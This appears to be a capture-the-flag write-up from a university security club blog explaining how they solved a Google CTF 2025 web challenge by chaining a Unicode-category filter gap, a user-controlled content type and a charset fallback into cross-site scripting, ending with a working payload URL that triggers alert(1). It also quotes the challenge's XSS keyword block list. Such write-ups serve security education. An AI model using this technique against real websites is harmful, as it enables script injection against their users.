@@ -1,0 +1,172 @@
+<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Lost in Transliteration</title><meta content="Lost in Transliteration" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/lostintrans/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="Lost in Transliteration" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/lostintrans/ property=twitter:url><meta content="Lost in Transliteration" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/lostintrans/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>lostintrans</span></div><time datetime=2025-08-05>Published on: <span class=accent-data>2025-08-05</span></time><address rel=author>By <span class=accent-data> Abizer Lokhandwala, and exploiitm </span></address><h1>Lost in Transliteration</h1><p>This is a really fun question that combines multiple vulnerabilities to get XSS.<h3 id=1-initial-analysis>1. Initial Analysis</h3><p>We can first look at the main app and see that it really just renders a page that translates Greek to Latin characters. It also looks at the Unicode category and only allows <strong>letters</strong> and <strong>other letters</strong> through, and Unicode-escapes the rest.<p>The vulnerability here is that it allows <code>OtherLetter</code>, which is not necessarily just Greek and Latin but also includes Chinese, Japanese, etc., which are allowed through <strong>without escaping</strong>.<h3 id=2-the-encoding-snippet>2. The Encoding Snippet</h3><pre class=language-csharp data-lang=csharp style=background:#282828;color:#fdf4c1aa><code class=language-csharp data-lang=csharp><span>private static bool IsSafeChar(char c)
+</span><span>{
+</span><span>    var cat = char.GetUnicodeCategory(c);
+</span><span>    // We don't consider ModifierLetter safe.
+</span><span>    var isLetter = cat == UnicodeCategory.LowercaseLetter ||
+</span><span>                   cat == UnicodeCategory.UppercaseLetter ||
+</span><span>                   cat == UnicodeCategory.OtherLetter;
+</span><span>
+</span><span>    return isLetter || char.IsWhiteSpace(c);
+</span><span>}
+</span><span>
+</span><span>private static string JsEncode(string? s)
+</span><span>{
+</span><span>    if (s is null)
+</span><span>    {
+</span><span>        return "";
+</span><span>    }
+</span><span>    var sb = new StringBuilder();
+</span><span>    foreach (char c in s)
+</span><span>    {
+</span><span>        if (IsSafeChar(c))
+</span><span>        {
+</span><span>            sb.Append(c);
+</span><span>        }
+</span><span>        else
+</span><span>        {
+</span><span>            sb.Append("\\u");
+</span><span>            sb.Append(Convert.ToInt32(c).ToString("x4"));
+</span><span>        }
+</span><span>    }
+</span><span>    return sb.ToString();
+</span><span>}
+</span></code></pre><h3 id=3-javascript-snippet-that-renders-the-page>3. JavaScript Snippet That Renders the Page</h3><pre class=language-js data-lang=js style=background:#282828;color:#fdf4c1aa><code class=language-js data-lang=js><span style=font-style:italic;color:#928374>// Load Lit directly from the CDN.
+</span><span style=color:#fa5c4b>import </span><span>{
+</span><span>  </span><span style=color:#fdf4c1>LitElement</span><span>,
+</span><span>  </span><span style=color:#fdf4c1>html</span><span>,
+</span><span>} </span><span style=color:#fa5c4b>from </span><span style=color:#b8bb26>'https://cdn.jsdelivr.net/gh/lit/dist@3/core/lit-core.min.js'</span><span>;
+</span><span>
+</span><span style=color:#fa5c4b>function </span><span style=color:#8ec07c>transliterateGreekToLatin</span><span>(</span><span style=color:#fdf4c1>text</span><span>) {
+</span><span>    </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>greekMap </span><span style=color:#fe8019>= </span><span>{
+</span><span>        </span><span style=color:#b8bb26>'\u03b1'</span><span>: </span><span style=color:#b8bb26>'a'</span><span>, </span><span style=color:#b8bb26>'\u03b2'</span><span>: </span><span style=color:#b8bb26>'b'</span><span>, </span><span style=color:#b8bb26>'\u03b3'</span><span>: </span><span style=color:#b8bb26>'g'</span><span>, </span><span style=color:#b8bb26>'\u03b4'</span><span>: </span><span style=color:#b8bb26>'d'</span><span>, </span><span style=color:#b8bb26>'\u03b5'</span><span>: </span><span style=color:#b8bb26>'e'</span><span>, </span><span style=color:#b8bb26>'\u03b6'</span><span>: </span><span style=color:#b8bb26>'z'</span><span>, </span><span style=color:#b8bb26>'\u03b7'</span><span>: </span><span style=color:#b8bb26>'i'</span><span>, </span><span style=color:#b8bb26>'\u03b8'</span><span>: </span><span style=color:#b8bb26>'th'</span><span>,
+</span><span>        </span><span style=color:#b8bb26>'\u03b9'</span><span>: </span><span style=color:#b8bb26>'i'</span><span>, </span><span style=color:#b8bb26>'\u03ba'</span><span>: </span><span style=color:#b8bb26>'k'</span><span>, </span><span style=color:#b8bb26>'\u03bb'</span><span>: </span><span style=color:#b8bb26>'l'</span><span>, </span><span style=color:#b8bb26>'\u03bc'</span><span>: </span><span style=color:#b8bb26>'m'</span><span>, </span><span style=color:#b8bb26>'\u03bd'</span><span>: </span><span style=color:#b8bb26>'n'</span><span>, </span><span style=color:#b8bb26>'\u03be'</span><span>: </span><span style=color:#b8bb26>'x'</span><span>, </span><span style=color:#b8bb26>'\u03bf'</span><span>: </span><span style=color:#b8bb26>'o'</span><span>, </span><span style=color:#b8bb26>'\u03c0'</span><span>: </span><span style=color:#b8bb26>'p'</span><span>,
+</span><span>        </span><span style=color:#b8bb26>'\u03c1'</span><span>: </span><span style=color:#b8bb26>'r'</span><span>, </span><span style=color:#b8bb26>'\u03c3'</span><span>: </span><span style=color:#b8bb26>'s'</span><span>, </span><span style=color:#b8bb26>'\u03c2'</span><span>: </span><span style=color:#b8bb26>'s'</span><span>, </span><span style=color:#b8bb26>'\u03c4'</span><span>: </span><span style=color:#b8bb26>'t'</span><span>, </span><span style=color:#b8bb26>'\u03c5'</span><span>: </span><span style=color:#b8bb26>'y'</span><span>, </span><span style=color:#b8bb26>'\u03c6'</span><span>: </span><span style=color:#b8bb26>'f'</span><span>, </span><span style=color:#b8bb26>'\u03c7'</span><span>: </span><span style=color:#b8bb26>'ch'</span><span>, </span><span style=color:#b8bb26>'\u03c8'</span><span>: </span><span style=color:#b8bb26>'ps'</span><span>,
+</span><span>        </span><span style=color:#b8bb26>'\u03c9'</span><span>: </span><span style=color:#b8bb26>'o'</span><span>,
+</span><span>        </span><span style=color:#b8bb26>'\u03ac'</span><span>: </span><span style=color:#b8bb26>'a'</span><span>, </span><span style=color:#b8bb26>'\u03ad'</span><span>: </span><span style=color:#b8bb26>'e'</span><span>, </span><span style=color:#b8bb26>'\u03ae'</span><span>: </span><span style=color:#b8bb26>'i'</span><span>, </span><span style=color:#b8bb26>'\u03af'</span><span>: </span><span style=color:#b8bb26>'i'</span><span>, </span><span style=color:#b8bb26>'\u03cc'</span><span>: </span><span style=color:#b8bb26>'o'</span><span>, </span><span style=color:#b8bb26>'\u03cd'</span><span>: </span><span style=color:#b8bb26>'y'</span><span>, </span><span style=color:#b8bb26>'\u03ce'</span><span>: </span><span style=color:#b8bb26>'o'</span><span>,
+</span><span>        </span><span style=color:#b8bb26>'\u03ca'</span><span>: </span><span style=color:#b8bb26>'i'</span><span>, </span><span style=color:#b8bb26>'\u03cb'</span><span>: </span><span style=color:#b8bb26>'y'</span><span>,
+</span><span>        </span><span style=color:#b8bb26>'\u0391'</span><span>: </span><span style=color:#b8bb26>'A'</span><span>, </span><span style=color:#b8bb26>'\u0392'</span><span>: </span><span style=color:#b8bb26>'B'</span><span>, </span><span style=color:#b8bb26>'\u0393'</span><span>: </span><span style=color:#b8bb26>'G'</span><span>, </span><span style=color:#b8bb26>'\u0394'</span><span>: </span><span style=color:#b8bb26>'D'</span><span>, </span><span style=color:#b8bb26>'\u0395'</span><span>: </span><span style=color:#b8bb26>'E'</span><span>, </span><span style=color:#b8bb26>'\u0396'</span><span>: </span><span style=color:#b8bb26>'Z'</span><span>, </span><span style=color:#b8bb26>'\u0397'</span><span>: </span><span style=color:#b8bb26>'I'</span><span>, </span><span style=color:#b8bb26>'\u0398'</span><span>: </span><span style=color:#b8bb26>'Th'</span><span>,
+</span><span>        </span><span style=color:#b8bb26>'\u0399'</span><span>: </span><span style=color:#b8bb26>'I'</span><span>, </span><span style=color:#b8bb26>'\u039a'</span><span>: </span><span style=color:#b8bb26>'K'</span><span>, </span><span style=color:#b8bb26>'\u039b'</span><span>: </span><span style=color:#b8bb26>'L'</span><span>, </span><span style=color:#b8bb26>'\u039c'</span><span>: </span><span style=color:#b8bb26>'M'</span><span>, </span><span style=color:#b8bb26>'\u039d'</span><span>: </span><span style=color:#b8bb26>'N'</span><span>, </span><span style=color:#b8bb26>'\u039e'</span><span>: </span><span style=color:#b8bb26>'X'</span><span>, </span><span style=color:#b8bb26>'\u039f'</span><span>: </span><span style=color:#b8bb26>'O'</span><span>, </span><span style=color:#b8bb26>'\u03a0'</span><span>: </span><span style=color:#b8bb26>'P'</span><span>,
+</span><span>        </span><span style=color:#b8bb26>'\u03a1'</span><span>: </span><span style=color:#b8bb26>'R'</span><span>, </span><span style=color:#b8bb26>'\u03a3'</span><span>: </span><span style=color:#b8bb26>'S'</span><span>, </span><span style=color:#b8bb26>'\u03a4'</span><span>: </span><span style=color:#b8bb26>'T'</span><span>, </span><span style=color:#b8bb26>'\u03a5'</span><span>: </span><span style=color:#b8bb26>'Y'</span><span>, </span><span style=color:#b8bb26>'\u03a6'</span><span>: </span><span style=color:#b8bb26>'F'</span><span>, </span><span style=color:#b8bb26>'\u03a7'</span><span>: </span><span style=color:#b8bb26>'Ch'</span><span>, </span><span style=color:#b8bb26>'\u03a8'</span><span>: </span><span style=color:#b8bb26>'Ps'</span><span>,
+</span><span>        </span><span style=color:#b8bb26>'\u03a9'</span><span>: </span><span style=color:#b8bb26>'O'</span><span>,
+</span><span>        </span><span style=color:#b8bb26>'\u0386'</span><span>: </span><span style=color:#b8bb26>'A'</span><span>, </span><span style=color:#b8bb26>'\u0388'</span><span>: </span><span style=color:#b8bb26>'E'</span><span>, </span><span style=color:#b8bb26>'\u0389'</span><span>: </span><span style=color:#b8bb26>'I'</span><span>, </span><span style=color:#b8bb26>'\u038a'</span><span>: </span><span style=color:#b8bb26>'I'</span><span>, </span><span style=color:#b8bb26>'\u038c'</span><span>: </span><span style=color:#b8bb26>'O'</span><span>, </span><span style=color:#b8bb26>'\u038e'</span><span>: </span><span style=color:#b8bb26>'Y'</span><span>, </span><span style=color:#b8bb26>'\u038f'</span><span>: </span><span style=color:#b8bb26>'O'</span><span>,
+</span><span>        </span><span style=color:#b8bb26>'\u03aa'</span><span>: </span><span style=color:#b8bb26>'I'</span><span>, </span><span style=color:#b8bb26>'\u03ab'</span><span>: </span><span style=color:#b8bb26>'Y'
+</span><span>    };
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>let </span><span style=color:#fdf4c1>transliteratedText </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>''</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>for </span><span>(</span><span style=color:#fa5c4b>let </span><span style=color:#fdf4c1>i </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>; </span><span style=color:#fdf4c1>i </span><span style=color:#fe8019>< </span><span style=color:#fdf4c1>text</span><span>.</span><span style=color:#fabd2f>length</span><span>; </span><span style=color:#fdf4c1>i</span><span style=color:#fe8019>++</span><span>) {
+</span><span>        </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>char </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>text</span><span>[</span><span style=color:#fdf4c1>i</span><span>];
+</span><span>        </span><span style=color:#fdf4c1>transliteratedText </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>greekMap</span><span>[</span><span style=color:#fdf4c1>char</span><span>] </span><span style=color:#fe8019>|| </span><span style=color:#fdf4c1>char</span><span>;
+</span><span>    }
+</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>transliteratedText</span><span>;
+</span><span>}
+</span><span>
+</span><span style=font-style:italic;color:#928374>// Main component, available as &LTgreek-transliteration-app>.
+</span><span style=color:#fa5c4b>class </span><span style=color:#8ec07c>GreekTransliterationApp </span><span style=color:#fa5c4b>extends </span><span style=color:#8ec07c>LitElement </span><span>{
+</span><span>    </span><span style=color:#fa5c4b>static </span><span style=color:#fdf4c1>properties </span><span style=color:#fe8019>= </span><span>{
+</span><span>        greekText: { type: </span><span style=color:#8ec07c>String </span><span>},
+</span><span>        latinText: { type: </span><span style=color:#8ec07c>String </span><span>},
+</span><span>    };
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>constructor</span><span>() {
+</span><span>        </span><span style=color:#fdf4c1>super</span><span>();
+</span><span>        </span><span style=color:#fdf4c1>this</span><span>.</span><span style=color:#fdf4c1>greekText </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>''</span><span>;
+</span><span>        </span><span style=color:#fdf4c1>this</span><span>.</span><span style=color:#fdf4c1>latinText </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>''</span><span>;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#8ec07c>createRenderRoot</span><span>() {
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>this</span><span>;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#8ec07c>handleInputChange</span><span>(</span><span style=color:#fdf4c1>event</span><span>) {
+</span><span>        </span><span style=color:#fdf4c1>this</span><span>.</span><span style=color:#fdf4c1>greekText </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>event</span><span>.</span><span style=color:#fabd2f>target</span><span>.</span><span style=color:#fabd2f>value</span><span>;
+</span><span>        </span><span style=color:#fdf4c1>this</span><span>.</span><span style=color:#fdf4c1>latinText </span><span style=color:#fe8019>= </span><span style=color:#8ec07c>transliterateGreekToLatin</span><span>(</span><span style=color:#fdf4c1>this</span><span>.</span><span style=color:#fdf4c1>greekText</span><span>);
+</span><span>
+</span><span>        </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>url </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>new </span><span style=color:#8ec07c>URL</span><span>(</span><span style=color:#fabd2f>window</span><span>.</span><span style=color:#fabd2f>location</span><span>.</span><span style=color:#fabd2f>href</span><span>);
+</span><span>        </span><span style=color:#fdf4c1>url.searchParams.</span><span style=color:#fabd2f>set</span><span>(</span><span style=color:#b8bb26>'q'</span><span>, </span><span style=color:#fdf4c1>this</span><span>.</span><span style=color:#fdf4c1>greekText</span><span>);
+</span><span>        </span><span style=color:#fabd2f>window</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>history</span><span style=color:#fdf4c1>.</span><span style=color:#8ec07c>replaceState</span><span>({}, </span><span style=color:#b8bb26>''</span><span>, </span><span style=color:#fdf4c1>url.</span><span style=color:#fabd2f>toString</span><span>());
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#8ec07c>render</span><span>() {
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#8ec07c>html</span><span style=color:#b8bb26>`
+</span><span style=color:#b8bb26>            &LTdiv class='container'>
+</span><span style=color:#b8bb26>                &LTh1>Greek to Latin Transliterator&LT/h1>
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>                &LTinput
+</span><span style=color:#b8bb26>                    type='text'
+</span><span style=color:#b8bb26>                    autofocus
+</span><span style=color:#b8bb26>                    .value='${</span><span style=color:#fdf4c1>this</span><span style=color:#b8bb26>.</span><span style=color:#fdf4c1>greekText</span><span style=color:#b8bb26>}'
+</span><span style=color:#b8bb26>                    @input='${</span><span style=color:#fdf4c1>this</span><span style=color:#b8bb26>.</span><span style=color:#fdf4c1>handleInputChange</span><span style=color:#b8bb26>}'
+</span><span style=color:#b8bb26>                    placeholder='Enter Greek text here...'
+</span><span style=color:#b8bb26>                >
+</span><span style=color:#b8bb26>                &LTp class='example-text'>Examples: &ampPi;&ampupsilon;&amptheta;&ampalpha;&ampgamma;&ampomicron;&amprho;&ampalpha;&ampsigmaf;, &ampSigma;&ampomega;&ampkappa;&amprho;&ampalpha;&amptau;&ampeta;&ampsigmaf;, &ampAlpha;&amprho;&ampiota;&ampsigma;&amptau;&ampomicron;&amptau;&ampepsilon;&amplambda;&ampeta;&ampsigmaf;&LT/p>
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>                &LTdiv style='margin-top: 10px;'>
+</span><span style=color:#b8bb26>                    &LTspan class='output-label'>Latin Transliteration:&LT/span>
+</span><span style=color:#b8bb26>                    &LTdiv id='outputBox'>${</span><span style=color:#fdf4c1>this</span><span style=color:#b8bb26>.</span><span style=color:#fdf4c1>latinText</span><span style=color:#b8bb26>}&LT/div>
+</span><span style=color:#b8bb26>                &LT/div>
+</span><span style=color:#b8bb26>            &LT/div>
+</span><span style=color:#b8bb26>        `</span><span>;
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span style=color:#fdf4c1>customElements.</span><span style=color:#8ec07c>define</span><span>(</span><span style=color:#b8bb26>'greek-transliteration-app'</span><span>, </span><span style=color:#fdf4c1>GreekTransliterationApp</span><span>);
+</span><span>
+</span><span style=font-style:italic;color:#928374>// Load the query from request.
+</span><span style=font-style:italic;color:#928374>// TODO: Maybe we should move this directly to HTML into a &LTscript> tag?
+</span><span style=color:#fabd2f>window</span><span>.</span><span style=color:#fdf4c1>q </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'TEMPLATE_QUERY_JS'</span><span>;
+</span><span>
+</span><span style=font-style:italic;color:#928374>// XSS prevention
+</span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>PAYLOADS </span><span style=color:#fe8019>= </span><span>[</span><span style=color:#b8bb26>`&LTscript>`</span><span>, </span><span style=color:#b8bb26>`&LT/script>`</span><span>, </span><span style=color:#b8bb26>`javascript:`</span><span>, </span><span style=color:#b8bb26>`onerror=`</span><span>];
+</span><span style=color:#fa5c4b>for </span><span>(</span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>payload </span><span style=color:#fe8019>of </span><span style=color:#fdf4c1>PAYLOADS</span><span>) {
+</span><span>  </span><span style=color:#fa5c4b>if </span><span>(</span><span style=color:#fabd2f>window</span><span style=color:#fdf4c1>.q.</span><span style=color:#fabd2f>toLowerCase</span><span>()</span><span style=color:#fdf4c1>.</span><span style=color:#8ec07c>includes</span><span>(</span><span style=color:#fdf4c1>payload</span><span>)) {
+</span><span>    </span><span style=color:#fa5c4b>throw new </span><span style=color:#8ec07c>Error</span><span>(</span><span style=color:#b8bb26>'XSS!'</span><span>);
+</span><span>  }
+</span><span>}
+</span><span>
+</span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>mainApp </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>createElement</span><span>(</span><span style=color:#b8bb26>'greek-transliteration-app'</span><span>);
+</span><span style=color:#fdf4c1>mainApp</span><span>.</span><span style=color:#fdf4c1>greekText </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>window</span><span>.</span><span style=color:#fdf4c1>q</span><span>;
+</span><span style=color:#fdf4c1>mainApp</span><span>.</span><span style=color:#fdf4c1>latinText </span><span style=color:#fe8019>= </span><span style=color:#8ec07c>transliterateGreekToLatin</span><span>(</span><span style=color:#fabd2f>window</span><span>.</span><span style=color:#fdf4c1>q</span><span>);
+</span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>body</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>appendChild</span><span>(</span><span style=color:#fdf4c1>mainApp</span><span>);
+</span></code></pre><h3 id=4-the-file-serving-logic>4. The File Serving Logic</h3><pre class=language-csharp data-lang=csharp style=background:#282828;color:#fdf4c1aa><code class=language-csharp data-lang=csharp><span>app.MapGet("/", (string q = "", string ct = "") =>
+</span><span>{
+</span><span>  return Results.Text($@"
+</span><span>        &LT!doctype html>&LTmeta charset=utf-8>
+</span><span>        &LTbody>
+</span><span>        &LTlink href='https://fonts.googleapis.com/css2?family=Palatino+Linotype&ampamp;display=swap' rel='stylesheet'>
+</span><span>        &LTlink rel=stylesheet href='/file?filename=style.css&ampamp;ct=text/css'>
+</span><span>        &LTscript type=module src='/file?filename=script.js&ampamp;q={HttpUtility.UrlEncode(q)}&ampamp;ct=text/javascript'>&LT/script>
+</span><span>      ",
+</span><span>      contentType: "text/html");
+</span><span>});
+</span><span>
+</span><span>app.MapGet("/file", (string filename = "", string? ct = null, string? q = null) =>
+</span><span>{
+</span><span>  string? template = FindFile(filename);
+</span><span>  if (template is null)
+</span><span>  {
+</span><span>    return Results.NotFound();
+</span><span>  }
+</span><span>  ct ??= "text/plain";
+</span><span>  if (!IsValidContentType(ct))
+</span><span>  {
+</span><span>    return Results.BadRequest("Invalid Content-Type");
+</span><span>  }
+</span><span>  string text = template
+</span><span>      .Replace("TEMPLATE_QUERY_JS", JsEncode(q));
+</span><span>  return Results.Text(text, contentType: ct);
+</span><span>});
+</span></code></pre><p>More importantly, this also means I can request any file with a content type that may be different. For example, in JS and HTML, the syntax for comments is different.<p>Look at this snippet:<pre class=language-js data-lang=js style=background:#282828;color:#fdf4c1aa><code class=language-js data-lang=js><span style=font-style:italic;color:#928374>// Load the query from request.
+</span><span style=font-style:italic;color:#928374>// TODO: Maybe we should move this directly to HTML into a &LTscript> tag?
+</span><span style=color:#fabd2f>window</span><span>.</span><span style=color:#fdf4c1>q </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'TEMPLATE_QUERY_JS'</span><span>;
+</span><span>
+</span><span style=font-style:italic;color:#928374>// XSS prevention
+</span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>PAYLOADS </span><span style=color:#fe8019>= </span><span>[</span><span style=color:#b8bb26>`&LTscript>`</span><span>, </span><span style=color:#b8bb26>`&LT/script>`</span><span>, </span><span style=color:#b8bb26>`javascript:`</span><span>, </span><span style=color:#b8bb26>`onerror=`</span><span>];
+</span></code></pre><p>Here in a normal JS file, the <code>&LTscript></code> tags would be useless. But if we serve the JS as HTML, then it becomes:<pre class=language-html data-lang=html style=background:#282828;color:#fdf4c1aa><code class=language-html data-lang=html><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>script</span><span style=color:#83a598>> </span><span style=color:#fdf4c1>tag</span><span style=color:#fe8019>?
+</span><span style=color:#fabd2f>window</span><span style=color:#fdf4c1>.q </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'TEMPLATE_QUERY_JS'</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>
+</span><span style=font-style:italic;color:#928374>// XSS prevention
+</span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>PAYLOADS </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>[</span><span style=color:#b8bb26>`&LTscript>`</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>`</span><span style=color:#83a598>&LT/</span><span style=font-weight:700;color:#8ec07c>script</span><span style=color:#83a598>>
+</span></code></pre><p>And our input is reflected exactly in <code>window.q</code>, so if we escape the string, it will just be able to execute arbitrary JS code.<hr><h3 id=5-avoiding-the-unicode-escape>5. Avoiding the Unicode Escape</h3><p>If the Unicode category is not a letter, the program will Unicode escape our input. But since we can define the encoding—if we set the encoding to some arbitrary charset that Chromium will not recognize—it defaults to <code>windows-1252</code>.<p>Using this, input of any Unicode character that has the byte <code>0x8C</code> will translate to a <code>'</code> in the script.<p>With this, we have successfully escaped the string. But we are still somewhat limited in the code we can execute, since it’s kind of hard to find characters that won’t break syntax.<hr><h3 id=6-constructing-the-payload>6. Constructing the Payload</h3><p>Now that we have escaped the string, we still need to make the script syntactically valid so it can execute.<p>First, we need to do something about the <code>tag?</code> that is right after the script tag—it will cause the app to error out. Luckily, we can append <code>: abcd</code>. This makes the expression:<pre style=background:#282828;color:#fdf4c1aa><code><span>tag ? window.q='asa' : abcd
+</span></code></pre><p>But again, our <code>:</code> and <code>'</code> will be preceded by weird characters. So we need to fix that.<p>We can do this by using the <code>in</code> operator:<pre style=background:#282828;color:#fdf4c1aa><code><span>tag ? window.q='asa' in ppp : abcd
+</span></code></pre><p>Now we’ve solved the syntax issues, but we still need to execute the code. We can do this by using <strong>tagged templates</strong>, like <code>setTimeout</code>.<p>We define the character preceding <code>'</code> as a variable = <code>setTimeout</code>, and then call that variable.<hr><h3 id=7-final-payload>7. Final Payload</h3><pre style=background:#282828;color:#fdf4c1aa><code><span>ct=text/html;charset=x-Chinese-CNS&q=x%E5%87%98in+%E5%98%84alert%0avar+%E5%A2%89setTimeout%0a%E5%AB%9Dalert(1)//%E5%AB%9D%0avar+tag%0a%E5%AB%9D
+</span></code></pre><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>
